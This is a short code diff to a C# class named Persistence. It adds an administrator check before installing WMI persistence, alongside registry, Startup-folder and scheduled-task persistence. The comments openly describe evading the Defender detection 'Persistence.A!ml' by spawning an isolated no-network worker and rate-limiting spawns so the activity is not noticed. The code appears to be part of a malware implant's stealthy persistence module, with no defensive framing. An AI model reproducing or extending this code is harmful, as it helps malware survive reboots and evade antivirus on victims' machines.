@@ -599,10 +599,18 @@ internal static partial class Persistence
         // Never write persistence keys from this process (which has network connection).
         // Spawn an isolated worker with no network instead — breaks Persistence.A!ml correlation.
         // Rate-limited to once per 90 seconds so the spawn is not visible as a process loop.
+        bool isAdmin = false;
+        try
+        {
+            using var id = System.Security.Principal.WindowsIdentity.GetCurrent();
+            isAdmin = new System.Security.Principal.WindowsPrincipal(id)
+                .IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
+        }
+        catch { }
         bool needsPersist = (Config.PersistRegistry && !IsRegistryInstalled(name))
                          || (Config.PersistStartup  && !IsStartupInstalled(name))
                          || (Config.PersistTask     && !IsTaskInstalled(name))
-                         || (Config.PersistWmi      && !IsWmiInstalled(name));
+                         || (isAdmin && Config.PersistWmi && !IsWmiInstalled(name));
         if (needsPersist && (DateTime.UtcNow - _lastWorkerSpawn).TotalSeconds >= 90)
         {
             _lastWorkerSpawn = DateTime.UtcNow;
